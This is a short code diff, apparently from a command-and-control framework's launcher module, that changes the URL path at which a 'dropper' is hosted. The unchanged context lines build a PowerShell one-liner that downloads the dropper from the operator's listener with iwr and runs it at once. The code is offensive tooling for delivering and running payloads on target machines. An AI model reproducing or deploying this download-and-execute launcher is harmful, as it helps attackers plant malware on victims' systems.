@@ -116,7 +116,7 @@ namespace Commander.Commands.Laucher
 
 
 
-                string url = $"{protocol}://{listener.Ip}:{listener.PublicPort}/{outFile}";
+                string url = $"{protocol}://{listener.Ip}:{listener.PublicPort}/wh/{outFile}";
                 context.Terminal.WriteLine($"[*] dropper hosted on : {url}");
 
                 string script = $"iwr -Uri '{url}' -OutFile '{outFile}'; .\\{outFile}";
